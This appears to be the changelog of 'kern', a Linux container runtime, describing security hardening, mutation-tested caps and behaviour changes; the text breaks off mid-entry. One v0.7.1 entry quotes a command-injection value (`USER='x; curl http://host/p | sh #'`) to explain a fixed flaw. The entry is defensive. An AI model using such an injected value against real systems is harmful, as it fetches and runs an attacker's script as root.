# Changelog

**CLI stability.** As of v0.7.0 the command surface is stable: the verbs, their flags, and the
`--json` output shapes change incompatibly only on a **minor bump** (`0.8.0`+, since kern is `0.x`),
never on a patch, and only after a deprecation entry here at least one release earlier. `--json`
output is additive: new fields may appear, so consumers must **ignore unknown fields**; removing or
renaming one is the breaking change the minor-bump rule covers. A `cli_surface_is_frozen` test
snapshots the surface and fails the build on any undocumented change. Internal config-file keys may still evolve, but
scripts and SDKs written against the CLI can rely on it. Install the release binary with
`curl -fsSL https://raw.githubusercontent.com/getkern/kern/main/install.sh | sh`, or build from source
with `cargo install --git https://github.com/getkern/kern getkern --locked`. Full detail for any entry
is in the git history.

## Unreleased

**This is a MINOR bump (0.8.0), not a patch.** Not because the command surface moved: it did not.
No verb or flag is removed or renamed, `--entrypoint` and compose's `-d` are additive, and the
`cli_surface_is_frozen` snapshot changed only in three description lines. By the letter of the
stability rule above, a patch would have been allowed.

The reason is that **three things that worked can now stop working**, all on existing paths, and a
patch number tells a reader the opposite. kern is installed by a one-liner and by
`cargo install --git`, both of which always take the latest: the version number is not read by a
resolver, it is read by a person deciding whether to look before upgrading. These are what they
would be looking for.

- **A numeric `USER` takes its group from the image's `/etc/passwd`, not from its own number.**
  A box that ran as `1000:1000` now runs as whatever the image declares, and as the ROOT group when
  the image lists no entry for that uid. If a volume holds files written under the old gid, check
  that the service can still write them.
- **An image `USER` the image cannot resolve now refuses to start the box.** It used to run the
  workload as box root after a note on stderr, so a box that STARTED now exits 1. Pass
  `--user <uid[:gid]>` to choose one, or `--user 0` for the old behaviour, made explicit.
- **An image reference the OCI grammar cannot hold is refused where you type it.**
  `kern build -t Foo-BAR:latest` and `kern pull Foo-BAR:latest` used to be accepted and to fail
  later, at push time or against a registry. Lowercase the reference; the error prints the exact
  string to use.

Nothing here had a deprecation entry a release earlier, which the rule above requires for the
COMMAND SURFACE. It is not owed for these, because none of them is a verb, a flag or a `--json`
shape, and it is stated rather than left to be noticed.

### Security

- **Five resource caps on untrusted registry data had no boundary test, and two security predicates
  had no test at all.** Found by mutation sampling rather than by reading: 20 mechanical mutants over
  files that have tests, of which 13 were ones a unit test could have killed and 5 survived - a 38%
  survival rate on reachable sites.

  Two of the five were the file's own defences. `take_data`'s `real_here.min(room)` is the bound that
  holds a returned buffer to `keep` on bytes from a registry; `min` became `max` and 920 tests stayed
  green. `has_bare_lf` is the documented request-smuggling defence; inverting it ACCEPTS the smuggled
  request and REJECTS well-formed CRLF, and nothing reached it because it sat inline in a function
  that takes a socket. It is a pure function now, which is the only shape in which it can be asserted
  in both directions.

  A second, targeted sweep over `vet_tar_stream` then found the pattern rather than the instance:
  8 of 14 mutants died, and FIVE of the six survivors were caps - `MAX_TAIL_BLOCKS`, `TAR_MAX_LONG`
  at three sites, `MAX_LAYER_ENTRIES`. The identity checks in that vetter were covered and not one of
  the limits was, and the limits are the whole defence against a malicious layer rather than a
  malformed one. `valid_allow_entry`'s 253-character FQDN bound was uncovered in the same way.

  MEASURED, NOT ASSUMED: the zero-padding boundary sits at `MAX_TAIL_BLOCKS - 1` extra blocks,
  because the end-of-archive marker's second zero block already enters the tail loop. The test says
  so, so the next reader does not go looking for an off-by-one that is not there.

  THE SAMPLE IS A LOWER BOUND. Sites were drawn only from files that HAVE tests, which excludes by
  construction the files most likely to hold a gap. "38% of sampled testable sites do not
  discriminate" is what was measured; "38% of the code is unprotected" was not.

  The two survivors outside the registry path are closed too. `clamp_cpus` needed its comparison
  EXTRACTED before it could be asserted at all: at `c == host` the clamped result and the unclamped
  one are the same number, so mutating `>` to `>=` leaves every return value untouched and changes
  only the warning - which then tells an operator that N CPUs "exceeds the N available". A false
  message was the entire observable difference. `profiles_table` put the selection marker on every
  row EXCEPT the selected one under `i != sel`, which is the `k`-kills-the-box failure reached from
  the rendering side.

  Injection: verified - every cap and predicate was re-mutated after its test landed; `>` to `>=` on
  the tail cap, on both `TAR_MAX_LONG` sites, on the entry cap and on `cpus_exceed_host`, `min` to
  `max` on the buffer bound, `!=` to `==` on the bare-LF check, `i == sel` to `i != sel` on the
  marker, and `> 253` / `<= 63` on the allowlist bounds. Each turns its own case red. The entry-cap
  case costs 7.1 s in debug because a two-million-member cap can only be asserted by reaching it.

### Changed

- **An image reference the OCI grammar cannot hold is refused where you type it, not where it
  finally breaks.** `kern build -t Foo-BAR:latest` succeeded and put that name in the local cache,
  which no registry will accept, so the refusal arrived at `kern push` after the build was already
  paid for. `kern pull Foo-BAR:latest` was worse: it dialled the registry and came back with
  `registry: no layers in manifest`, a message that names nothing about the actual problem.

  The rule is `kern_oci::valid_reference`, which already rejected uppercase. It was simply not
  consulted on either path, so this restricts nothing new: it applies an existing rule while it can
  still be acted on. When lowercasing is the whole fix, the error prints the exact string to type
  instead, and when it is not, it says nothing rather than suggesting a retype that changes nothing.

  Listed under Changed and not Fixed: a script that built an uppercase tag locally now stops. Docker
  refuses the same input at build with `repository name must be lowercase`, measured against Docker
  29.6.2 on the same host where kern accepted it.

  Injection: verified - removing either call site turns
  `an_image_reference_the_oci_grammar_cannot_hold_is_refused_before_any_work` red, with the parse
  returning `Build { tag: Some("Foo-BAR:latest") }`.

- **`kern compose <file> up -d` used to be a usage error.** `docker compose up -d` is the most
  common way anyone starts a stack, and the flag loop rejected every `-x` it did not know. `-d` and
  `--detach` are accepted now, silently rather than with the "has no effect" note the presentation
  flags get: kern's `up` starts the services and returns, so the flag names exactly what happens and
  the note would have been false. `--ansi`, `--progress`, `--no-ansi`, `--compatibility`,
  `--dry-run` and `--parallel` remain the ones that say they do nothing.

  Injection: verified - removing the arm turns
  `compose_up_accepts_the_detach_flag_because_that_is_what_it_already_does` red, and an unknown flag
  is still refused, which is the control that the arm did not open the gate for everything.

- **A numeric `USER` now takes its group from the image's `/etc/passwd`, not from its own number.**
  Listed here and not under Fixed: from kern's side it is a correction, and from the side of anyone
  running a box that worked - with a volume holding files written under the old gid - it is a
  behaviour change that can break them. A CHANGELOG is read to answer "does this break something of
  mine", and the honest classification is the one that answers that question rather than the one
  that describes the intent.

  Affects every image whose `USER` is numeric AND whose passwd entry declares a different primary
  group. `USER 1000` resolved to `gid 1000`; it now resolves to what the image says, and to the root
  group when the image lists no entry for that uid.

  VERIFIED AGAINST THE IMPLEMENTATION, not against documentation: `moby/sys/user`'s `GetExecUser`
  sets `user.Gid = users[0].Gid` from the matched passwd entry, and leaves `user.Gid` at
  `defaults.Gid` when a numeric uid has no entry - which runc's `libcontainer/init_linux.go` sets to
  `0`. The earlier claim rested on prose; this is the code that runs.

  `quay.io/keycloak/keycloak:26.1` declares `USER 1000` with `keycloak:x:1000:0:` and lays its tree
  out as `drwxrwxr-x root root`. With gid 1000 the process could not write its own installation,
  Quarkus' startup augmentation failed to write into its runner JAR, `jdk.nio.zipfs` reported the
  JAR as a read-only zip filesystem, and the box restart-looped on a `ReadOnlyFileSystemException`
  naming nothing about permissions. A field report attributed it to tmpfs exhaustion; reproduced
  here with 3.2 GB free, which ruled that out. The image now starts:
  `Keycloak 26.1.5 … started in 3.693s. Listening on: http://0.0.0.0:8080`.

  THE FIRST CORPUS FOR THIS WAS WORTHLESS AND IS RECORDED SO IT IS NOT REPEATED. Six official images
  were run and all answered `0:0` under both rules, because not one declares a `USER`: the check was
  never reached. It would have stayed green with the fix inverted. The corpus that replaced it was
  built to discriminate - `1000:0`, `1000:2000`, and a uid absent from passwd - and gives 1000/1000/1000
  under the old rule against 0/2000/0 under the new one, on three built images across two built
  binaries.

  Injection: verified - `Ok(n) => (n, n)` restored, and the always-0 variant; both turn
  `a_numeric_user_takes_its_primary_group_from_the_images_passwd` red on the discriminating rows.

  It moves box start onto a file read per box, which is why it was measured: 400 runs per side on an
  image that declares a `USER`, medians 3.5 ms on both, minima 2.8 against 2.9. That is a cost BELOW
  THE NOISE FLOOR of this measurement, which is not the same as no cost and is not claimed as one.

- **An image `USER` the image cannot resolve now refuses to start the box, as Docker does.** It used
  to run the workload as box root after printing a note on stderr, so that an odd image still
  started. That is the wrong shape of failure: an image whose entire purpose is to drop privilege got
  the opposite of what it asked for, and the only evidence was one line printed above the workload's
  own output. A field test reported the behaviour as "ran as 0:0, not an error" without mentioning
  the note at all, which is the argument against a warning in that position, demonstrated rather than
  asserted. Docker refuses the same input (`unable to find user X: no matching entries in passwd
  file`), and kern reads its user spec by Docker's rules everywhere else on that path.

  The escape hatch is not removed, it is made explicit: `--user 0` runs as box root on purpose, and
  an explicit `--user` still overrides an image whose own `USER` is unresolvable. Nothing changes for
  an image whose `USER` resolves, which is every image that works today; the check is in
  `resolve_run_as`, so the decision is asserted without an image on disk.

  Injection: verified - restoring the fallback turns
  `an_unresolvable_image_user_fails_closed_instead_of_running_as_box_root` red. Measured end to end:
  `USER 1000:nosuchgroup` and `USER nobodyhere` now exit 1, a resolvable `USER 1000` still gives
  `1000:0`, and `--user 0` still gives `0:0`.

- `kern doctor` no longer tells you to write `cgroup.subtree_control` where you have no permission to
  write it. It now says which of the two things is in the way, measured on the cgroup a box would be
  capped in.
- The uncapped-box warning names `XDG_RUNTIME_DIR` only when pointing it somewhere else would change
  the answer. On a host with no user manager at all it says so instead.
- The `no systemd user manager here` line in `doctor` says what that costs and what it prevents, so it
  no longer reads as good news one row under the warning that caps do not bind.

### Fixed
- **The macOS CI job tested one of the installer's two branches and could not tell them apart.**
  `install.sh` says something different to a Mac that already runs a Linux VM: use the one you have,
  do not install a second. Which branch a bare run takes depends on what the runner image happens to
  ship, so the job could not assert which message it had seen, and its one content check,
  `grep -q colima`, matched in BOTH branches (`brew install colima` in one, `colima ssh` in the
  other). It would have stayed green with the branches swapped.

  Both branches are driven from a built PATH now. `PATH=/usr/bin:/bin` was not it: `docker` sits in
  `/usr/bin` on plenty of systems, so "no VM here" would have been a property of the runner image
  rather than of the test. The environment holds a `sh` and a `uname` and nothing else, and the job
  asserts it is empty of VM tools before using it. The assertion that separates the branches is the
  ABSENCE of `brew install` from the message a Mac with a VM gets, which is that branch's entire
  reason to exist, and the control is that the two runs must differ at all.

  The refusal is also written as `if`, not `grep -q X && { exit 1; }`: a run step is `bash -e`, and
  in an AND-OR list only the last command is exempt from `-e`, so a grep that correctly finds
  nothing would have failed the step exactly when the product was right.

  Injection: verified - collapsing the installer's VM probe to `have=""` makes the has-a-VM
  assertions red under a simulated Darwin, and both branches then print the same text, which the
  control catches on its own.

- **`kern --help` did not name the values `--status` takes, the compose `-d` it now accepts, or
  `--profile`.** The vocabulary of `builds --status` was reachable only by typing something wrong
  and reading the usage error. Audited rather than spotted: every long flag the parser matches was
  compared against everything `--help` prints, in both directions. The reverse direction is clean,
  nothing is promised that kern refuses, and of the flags absent from the help, three are internal
  and documented as such in the source (`--def-hash`, `--overlay-lower`, `--overlay-upper`) and nine
  are long aliases of documented short forms.


- **The container-only port warning quoted port 8000 whatever the file said.** A stack declaring only
  `9090` was told about a port that appears nowhere in it, so the sentence read as an observation
  when it was an example. A field test had to isolate the case to establish that kern was not
  carrying stale state from another file before it could dismiss it. The note names the port that
  triggered it, and `warn_once` now dedupes per distinct port rather than per file.

  Injection: verified - restoring the fixed sentence turns
  `the_container_only_port_note_names_the_port_the_file_declared` red.

- **`kern doctor` reported a missing `/etc/subuid` allocation that was there.** The lookup
  interpolated `$USER` into the pattern it searched for, so with the variable unset it looked for
  lines beginning with `":"` and matched nothing: a host with `newuidmap` installed and
  `root:100000:65536` in the file was told that `--uid-range`, non-root `--user` and `--ssh` would
  fall back to a single-uid map, and handed a `sudo tee` line to add an allocation it already had.
  `USER` is not set for a daemon, a container, `sudo` without `-E`, or many CI runners, and this is
  the first command an operator runs.

  The identity now comes from `getuid` plus `/etc/passwd`, and BOTH spellings shadow-utils accepts
  are matched: the login name, which is what `useradd` writes, and the numeric uid. The environment
  is not consulted at all, which also retires the last use of a variable that had already produced a
  command-injection defect in this same function.

  Injection: verified - restoring the previous `doctor.rs` and running `env -u USER kern doctor` on a
  host whose allocation exists reproduces the false warning, with the wrong hint (`echo
  1000:100000:65536 ...` while `alex:100000:65536` was already present). Reported from the field
  against the `dev` branch.

- **`kern builds --status interrupted` listed builds that the same command printed as `running`.**
  `running` and `interrupted` are one stored status told apart only by asking whether the process is
  still there, and the filter compared the STORED status, so either word selected every unfinished
  record. Asking for interrupted builds returned the one that was building at that moment.

  The filter is answered by `Record::label`, the same call that fills the STATUS column, so the query
  and the column cannot disagree. This is the same shape as the defect it sits beside: a condition
  derived in two places drifts.

  Injection: verified - restoring the stored-status comparison turns
  `the_status_filter_selects_by_the_word_the_status_column_prints` red with
  `left: ["inflight", "abandoned"]`. Reported from the field against the `dev` branch.

- **The flat build's base copy now names what it costs and why.** `copy_tree` passes
  `--reflink=auto`, which clones the base on btrfs/xfs/bcachefs and silently falls back to a full
  byte copy everywhere else - `auto` is defined not to complain. That one property decides whether a
  flat build of a 2 GB base costs milliseconds or minutes, and nothing said which one you had. The
  build line and `kern doctor` both state it now.

  Injection: verified - dropping the probe's cleanup turns
  `the_reflink_probe_answers_and_leaves_nothing_behind` red.

  Measured while evaluating a field report's suggestion to "cache the flattened base rootfs per
  image": kern already does that, at pull time - the image cache IS a flattened rootfs, with no
  layer chain to merge - and an unchanged rebuild is already skipped
  (`[cached · flat image unchanged]`, 0.00 s). What remains is the writable copy, which cannot be a
  hardlink farm without a RUN step corrupting the shared cache, and cannot be an overlay because the
  flat path exists precisely where overlay is unavailable. On this ext4 host `cp --reflink=always`
  is refused and a 2.1 GB base copies in 0.86 s with the source in page cache - a LOWER BOUND, since
  the caches cannot be dropped without privilege. The reporter's 2m49s is WSL2's filesystem, not a
  repeated flattening.

- **The README's compatibility promise now carries the constraint that qualifies it.** The
  shared-namespace rule - two services in one stack cannot both listen on the same container port -
  lived only in `docs/DOCKER-COMPAT.md`, while the README said `read as-is`, "with no conversion
  step" and `# a real stack, unchanged` under the heading *"Your Docker Compose stack, without
  Docker Desktop"*. A heading takes no clause, and the possessive claimed every reader's file, so
  that one is now *"Docker Compose files, without Docker Desktop"* with the constraint in the
  paragraph under it and in the comparison row.

  Injection: none - prose only. The behaviour it now describes is asserted elsewhere
  (`cli_surface_is_frozen`, and the port-collision entry below).

  The Status line said the CLI surface can still change. That has been false since v0.7.0: the
  CHANGELOG declares it stable and `cli_surface_is_frozen` holds the build to a committed snapshot.
  Config-file keys, which no gate freezes, keep the caveat.

- **A refused port collision named the box, not the service.** `services 'myapp-keycloak' and
  'myapp-api' both listen on container port 8080/tcp` for a file whose services are `keycloak` and
  `api`, because both checks read `ComposeBox::name` after it has been rewritten to the box name.
  Injection: verified - restoring `b.name` in either check turns
  `the_collision_message_names_the_services_the_file_declares` red; both were tried separately.

  Fixed in the container-port check and the host-port check together: fixing one would have left a
  reader chasing a name their file does not contain on half the failures.

- **`kern box --entrypoint`: an override that actually overrides.** Repeatable (one argv element per
  occurrence, so an exec-form list needs no quoting convention), and `--entrypoint ""` clears the
  image's entrypoint the way compose's `entrypoint: []` does. Additive to the frozen CLI surface: no
  verb or flag was removed or renamed.

  It replaces two workarounds that could not work. The `docker` shim implemented `--entrypoint` by
  PREPENDING the value to the box command, and the compose parser folded `entrypoint:` into
  `command:` the same way. Both compose to `IMAGE_ENTRYPOINT ++ override ++ args` once the box
  prepends the image's own entrypoint - correct only for an image that HAS no entrypoint, which is
  never the case anyone reaches for an override in. Measured against
  `quay.io/keycloak/keycloak:26.1`, whose entrypoint is `kc.sh`: asking for a shell produced
  `kc.sh sh -c …` and the image answered `Unknown option: 'sh'`, which is what stopped a field
  report from getting a shell inside an image to diagnose a crash loop.

  Injection: verified - four, one per call site: the override ignored, the image CMD kept, the shim
  prepending again, and compose merging into `command`. Each turns its own case red.

  Both callers forward the flag now, so the CLI, the shim and compose cannot disagree about it, and
  the override discards the image's `CMD` as Docker documents - a default that belonged to the
  entrypoint being replaced.

- Two users on one machine can now both run boxes when `$XDG_RUNTIME_DIR` is shared between them (a
  WSL distro with WSLg exports the same path to every uid). Whoever started a box first used to lock
  the other out with `overlay scratch: Permission denied`. kern picks the next scratch location and
  says so.
- A failure to create the box scratch now names the directory.

## v0.7.1 - 2026-08-28

### Added

- **`kern doctor` reports what a VRAM cap on each GPU would be worth.** One line per DRM card.
  `TIER-HW` where the device enforces a partition (SR-IOV virtual function, or MIG instances
  configured). `TIER-SOFT` everywhere else, which on consumer hardware means a cooperative quota:
  worth density, fairness and overcommit accounting, **not a boundary against malicious code**. kern
  still slices no GPU; this publishes the judgement before the capability. There is no middle tier
  because `dmem` does not enforce the compute path ML tenants use: with `dmem.max` at 2 GB an 8 GB
  `hipMalloc` succeeded while `dmem.current` stayed at 0. Detection is read-only, opens no device,
  and costs 36 us per scan.

- **`--landlock-rw <path>` works on `kern run`**, not only on `kern box`. Landlock restricts the
  calling process, so no namespace is needed: `kern run --landlock-rw ~/project -- ./agent` confines
  the binary's writes to that directory. Three differences from `box`, all because there is no
  namespace: it grants only what you name plus the usual character devices, so `/tmp` and `/run` are
  not automatic; it refuses to run where the kernel has no Landlock; and it implies `no_new_privs`,
  so `sudo` inside the confined command stops working. A path that does not exist, or whose last
  component is a symlink, is refused rather than skipped. Additive: no existing invocation changes.

- **A fifth adversarial suite, `pentest/pentest-gpu-claims.sh`**, attacking a claim rather than a
  mechanism: whether `kern doctor`'s verdict about each card survives contact with the driver. T5 is
  the decisive case and it fails the way the tier model says it must, on three machines: a process
  with no vendor library in its address space reaches the driver with a raw ioctl. It starts no box,
  so it runs **in CI on every push**, unlike the other four.

### Fixed

- ⚠️ **A box that used to run uncapped on some hosts is now capped, and can be OOM-killed where it
  previously survived.** `--memory` and the pid cap now bind when kern runs **as root** on a host
  with no `systemd --user` manager: a container, or WSL2, where kern is uid 0. Boxes there had no
  ceiling at all, including the defaults that apply with no flags. `kern doctor` shows which kind of
  host you are on; `--allow-uncapped` keeps the old behaviour. Hosts that were already capping are
  unaffected, and so is a ROOTLESS session with no user manager: there kern still has no cgroup it
  may write to, and still says so at every start. A colima guest reached over `colima ssh` is that
  second case, measured on Apple Silicon: the session lands in `/system.slice/ssh.service`, owned by
  root and not writable by the user, and no `user@<uid>.service` is ever created.

- **`kern doctor` interpolated `$USER` into a `sudo` command it invites you to paste.** With
  `USER='x; curl http://host/p | sh #'` it printed a line that runs an attacker's script as root. It
  is now an allowlist of the portable name set, falling back to the numeric uid.

- **macOS is answered where a Mac user looks.** The installer refused Darwin and stopped; the README,
  the platform table and both SDK pages did not mention macOS at all. All of them now say the same
  thing: no native port, kern runs inside a Linux VM on a Mac, verified on Apple Silicon with an
  Ubuntu 24.04 guest, with the two obstacles that guest produces and their fixes. The installer looks
  for a VM you already have before suggesting one. CI runs those messages on a real Mac every push.

- **`kern examples` promised a per-line GPIO grant kern does not make.** It said `pins` exposes only
  those lines; the grant is chip-granular, and requesting any pin binds every `/dev/gpiochipN` on the
  host. Corrected where the field is declared, with a test that fails on the old wording.

- **A Landlock grant on a file rather than a directory no longer loses the whole ruleset.** The rule
  carried directory-only rights, the kernel answered `EINVAL` on a file, and the failure discarded
  every rule. `kern box --landlock-rw /etc/hosts` failed that way on both verbs.

- **`TIER-HW` claimed an enforcement it had not measured.** It read "per-tenant VRAM enforced by the
  device"; what the detector establishes is a topology, not a memory split. The string now names both
  gaps, including that the verdict is per card while MIG partitions per instance.

## v0.7.0 - 2026-08-24

The first published release: static binaries for x86_64 and aarch64, a Windows shim and a WSL rootfs,
each with a `.sha256`, from a GPG-signed and independently timestamped tag. Everything below shipped in it.

### Security

- **`--landlock-rw` is now fail-closed** (behaviour change, and the only one to a flag's meaning in
  this release). On a kernel without the Landlock LSM it used to warn and start the box with no path
  allowlist; it now refuses to start. kern already had an enforce-or-do-not-run family
  (`--require-limits` for cgroup caps, `--apparmor` for the LSM profile) and this was the one member
  that degraded, so the same script confined writes on a laptop and confined nothing on a board. The
  refusal names the flag, both reasons the LSM can be absent (not built in, or switched off with
  `lsm=`), and the way out. **Boxes that do not pass the flag are unaffected.** The cost is deliberate:
  a script that hard-codes `--landlock-rw` across a mixed fleet now fails on the boards rather than
  running unconfined there, and `kern doctor` reports the ABI so it can be gated. Verified on a
  Raspberry Pi 5 whose only LSM is `capability` (refused, message names the flag; without the flag the
  box starts) and on a Landlock ABI v8 host (write inside the allowlist succeeds, write outside is
  denied).
- The default seccomp filter is now a deny-by-default **allowlist** (moby's own default filter minus
  kern's 35 escape syscalls), not the wider denylist: a syscall outside the vetted set returns
  `ENOSYS`, and the escape vectors still hard-kill (`mount`/`unshare`/a namespace-flagged `clone`
  all SIGSYS, verified on a default box). This is Docker's own default posture minus 34, so it is at
  least as compatible while being strictly narrower - the whole future syscall surface is closed by
  default rather than reached. The wider denylist is the opt-out via `KERN_SECCOMP=denylist`;
  `--security-profile untrusted` is unchanged (allowlist + `--cap-drop ALL` + `--read-only`), and an
  `exec` reproduces the box's own recorded filter. Validated: a default box runs common workloads
  (shell, `ls`, `cat`, `id`) and 436 unit tests pass.
- Registry-posture forgery closed: every host-path input (`-v`, `--secret`, `--env-file`, `--rootfs`,
  build context and `-f`, `kern cp` in both directions, `save -o`) refuses any source that resolves
  onto the trust-bearing runtime dirs, by `(device, inode)` identity as well as path. The default is
  inverted: everything under the runtime dir is refused except the box-data `logs/` and `scratch/`.
- `socket(AF_VSOCK, …)` refused with `EAFNOSUPPORT` in both seccomp modes.
- The bounding-set drop is verified with `PR_CAPBSET_READ`, and under `--cap-drop ALL` every set
  (`CapEff`/`CapPrm`/`CapInh`/`CapAmb`/`CapBnd`) is read back all-zero from `/proc/self/status` -
  ambient included, since it survives `execve` and `NO_NEW_PRIVS` does not clear it.
- `CAP_SYS_PTRACE` dropped by default (16 caps), closing the **cross-UID** `/proc/<pid>/mem` read.
  (A same-uid sibling read inside one box is standard Linux and not a boundary; a host or peer-box
  pid is not visible in the box's pid namespace, so its memory is unreachable regardless.)
- `CAP_NET_ADMIN` and `CAP_SYS_ADMIN` dropped by default too, converging kern's default capability
  set onto Docker's/Podman's. They are re-kept CONDITIONALLY: `NET_ADMIN` for `--tun` (the box brings
  its own tunnel interface up; kern brings `lo` up before the drop, so loopback is unaffected) and
  `SYS_ADMIN` for `--privileged` (in-namespace `mount`), or either via `--cap-add`. `kern exec` stays
  strict and re-keeps neither, staying no more privileged than the box's PID 1. Their escape syscalls
  (the mount API, `bpf`) are seccomp-killed on a non-privileged box regardless, so this is
  defense-in-depth, not a boundary change.
- The seccomp mode is recorded and reproduced by `kern exec` and the health probe, not re-derived
  from the caller's env; an absent or corrupt record makes `exec` fail-loud.
- `KERN_MAX_CONCURRENT` enforced atomically under a `flock`, closing the fleet-cap TOCTOU.
- A SIGKILL'd detached supervisor's box is reaped via `cgroup.kill`.
- An inherited caller fd no longer leaks into the box: `shed_inherited_fds` before `execvp`
  (CVE-2016-9962 class).
- A pulled layer's setuid/setgid bit is stripped at extraction.
- OCI supply-chain hardening: a digest-pinned pull (`img@sha256:<hex>`) is content-addressed - the
  fetched manifest and the selected arch sub-manifest are sha256-verified, so a compromised registry
  cannot serve different bytes under a pin. The tar vetter also rejects a hardlink whose target
  descends an escaping symlink (a host-inode disclosure/corruption class), and an aggregate layer-count
  cap bounds a resource-exhaustion manifest.

### Fixed

- **A box's exit code no longer depends on the init system's version.** Same binary, same workload
  past its `--memory` cap: an Arduino UNO Q (systemd 257) reported **143** where a Raspberry Pi 5 (252)
  and a Jetson Orin Nano (249) reported **137**, and a DETACHED box on the newer manager left no exit
  record at all - `kern ps -a` empty, `kern wait` answering "no exit record for one" - so an SDK could
  not tell an OOM-killed box from one that never ran. The kernel had SIGKILLed the box on all three;
  what differed is that the newer systemd's default `OOMPolicy=stop` answers that same kill by stopping
  the unit, with a SIGKILL to the whole scope - including the kern process that had the box's status in
  hand and had not yet written it. Three things now hold it: on the scope path the box is capped in its
  OWN cgroup inside the scope (`kern-box-*`, at exactly the requested cap) with kern's supervisor in a
  `kern-sup` sibling, so the whole-box OOM kill takes the workload and not the bookkeeper; a fatal
  signal that reaches a waiting kern no longer costs the box its verdict; and the scope is asked for
  `OOMPolicy=continue` where the manager accepts it - PROBED once per boot, never version-gated,
  because an older manager rejects the property outright and would fail the `systemd-run` the box
  depends on. MEASURED after: **137 on all three boards, foreground and detached, exit record present**,
  with the cap read back at exactly `--memory` and no leaked scope, unit or process. `--memory` is now
  the WORKLOAD's ceiling on that path - kern's own ~1.3 MB no longer comes out of your budget - and the
  cost is ~2 ms of box start on the scope path only (x86's direct path measured unchanged at
  ~2.6 ms/box). Two things deliberately NOT done, both measured: `Delegate=yes` on the scope, which
  would be the textbook way to own that subtree and took a Jetson from 8 ms to **846 ms** per scope
  (kern does not need it - a user manager already creates the directory as the user), and a blanket
  `OOMPolicy=continue`, which on systemd 249 fails scope creation and would have started the box
  **uncapped**.
- **A signal aimed at a foreground `kern box` is aimed at the box.** kern used to die on a SIGTERM and
  leave the box to the PDEATHSIG cascade; it now forwards the signal, keeps waiting, and exits with the
  WORKLOAD's code - `docker run`'s contract, and what makes the exit code above survive a manager that
  stops the unit underneath it. A workload that ignores the first signal cannot make kern unkillable:
  the second exits immediately with `128+signo`, and `kern stop --stop-timeout 0` / SIGKILL remain the
  hard escapes. Behind a supervisor (a detached box) the signal is deliberately NOT relayed inwards -
  the box is already signalled directly, and relaying it was measured to record 143 for an OOM-killed
  box, kern's own SIGTERM beating the kernel's `oom.group` SIGKILL to the workload.
- **A service's `stop_grace_period` is its own upper bound again, not the longest one in the file.**
  `stop` shared ONE deadline across the stack, set to the longest grace configured anywhere in it,
  and floored the remainder at a second - so a service that asked for 1 s could be held far longer.
  MEASURED on a two-service stack, one asking 4 s and one asking 1 s, both hanging in their handler:
  the 1 s service was SIGKILLed at 5154 ms and the stop took 5010 ms. Each box's grace is now counted
  from the phase-1 signal against ITS OWN timeout: the same stack kills it at 1154 ms and finishes in
  4008 ms, which is max(grace) - the convergence the shared deadline existed for, without overriding
  what each service asked for. The bound stays one-sided by design: a member is never killed BEFORE
  its own grace, and can be killed later if a longer-grace member is torn down first, because the
  loop is sequential - and `stop` now waits on the SHORTEST grace first, which makes that loop
  optimal: each member waits only the difference from the one before it. MEASURED on a four-service
  stack asking 1, 2, 4 and 6 s, all hanging in their handler: before, the 1 s service was killed at
  6201 ms and the 4 s one at 6201; after, they die at 1195, 2196, 4200 and 6196, each on its own
  second, with the stack still finishing in 6008 ms. Reordering the waits reorders no shutdown -
  phase 1 signals every box at once - only which confirmation kern waits for first. Found by an
  external stress run of a mixed compose stack, in its own numbers: a service measured at 2005 ms
  alone took 3010 ms inside the stack.
- **Four lines of help and docs that no longer matched the code.** Found by re-reading the text
  against measured behaviour rather than against itself. `kern wait`'s help still said "Wait for
  RUNNING box(es)" after it learned to answer for one that already exited. `prune`'s said it removes
  "logs/health" while it also drops the exit record `wait` and `ps -a` read - which is the very thing
  that makes `wait` fail right after a `prune`, and that failure then blamed the one-hour window:
  measured, the box had exited two seconds earlier. And docs/DOCKER-COMPAT.md claimed `kill` "skips
  the wait": MEASURED at 3019 ms against `stop`'s 3013 on the same three-second grace, so it is a
  plain alias and a script that wants Docker's immediate kill wants `--stop-timeout 0`. That last one
  was written in this same release and was wrong when written.
- **`--stop-timeout`'s help says when the grace is skipped.** The flag read "Seconds the workload
  gets to exit on its own before the SIGKILL (default 10)", which promises a wait kern deliberately
  does not take when the box's init has no handler for the signal: a namespace PID 1 DISCARDS a
  signal it has no handler for, so the workload cannot die of it and the grace is a guaranteed wait
  for an event that can never happen (Docker and Podman sit it out anyway, measured at 10 278 and
  10 287 ms against kern's 21.9). The behaviour is unchanged and was already in BENCHMARKS.md and
  docs/DOCKER-COMPAT.md; what was missing is the one line a surprised reader looks at first. An
  external audit read `trap "" TERM` stopping in 4 ms as a defect, comparing it against the 3009 ms
  this project had published for `trap "sleep 60" TERM` - a handler that CATCHES the signal and never
  returns, which does spend the whole grace. Both numbers were right; the flag's own help did not say
  so. The two shapes are now an end-to-end test each, side by side, rather than prose.
- **An orphaned box is recoverable on the systemd-scope path too**, not only on the direct one. kern
  reaps a box whose supervisor was killed by remembering that box's own cgroup, and the path is
  recorded only when it names a `kern-box-*` dir - deliberately, because on the scope path a box's
  cgroup can be a scope kern did NOT create (`kern doctor` suggests `systemd-run --user --scope bash`
  to pay the scope cost once, and every box in that shell shares the shell's scope, so recording it
  would let a later reap `cgroup.kill` the user's whole session). The transient scope kern asks
  systemd for is now NAMED `kern-box-<pid>.scope`, which settles ownership by construction: an
  ambient scope is `run-*` and stays unrecorded. MEASURED on an Arduino UNO Q (aarch64, rootless,
  user systemd) before: SIGKILL a box's supervisor and the box vanished from `kern ps` while four of
  its processes kept running, with `kern stop` answering "no running box". After: `kern ps` shows it
  `orphaned`, `kern stop` reports "reaped via cgroup.kill", and no process is left. The recorded
  cgroup also lets the reaper hold engage there, so that board's exit codes went from 7 correct out
  of 10 under a bulk stop to 30 out of 30. The `.scope` suffix keeps the start-time orphan sweep off
  the dir (it reads the last `-` field as a pid, which never parses), and `stop` no longer rmdirs a
  cgroup that is a systemd unit - `--collect` removes it with the unit.
- **`kern wait` answers for a box that has already exited**, from the same exit record `kern ps -a`
  reads, for as long as `ps -a` still lists it (an hour). It used to refuse - "kern keeps no stopped
  boxes" - which was an inconsistency in kern's own surface rather than ephemerality: `ps -a` listed
  that box WITH its code while `wait` declined to print the same number, so a script that stopped a
  service could not ask how it had exited. Docker answers immediately there too. A box that is still
  running is unaffected: `wait` blocks until it exits, as before. Outside the window, and for an
  interactive `-it` box that never had a supervisor to record a code, `wait` still fails and says
  which case it is.
- **`--stop-timeout` is honoured in full, not rounded down to whole seconds.** `stop` waits the time
  LEFT until a deadline shared by the whole stack, and that remainder was truncated to seconds, so a
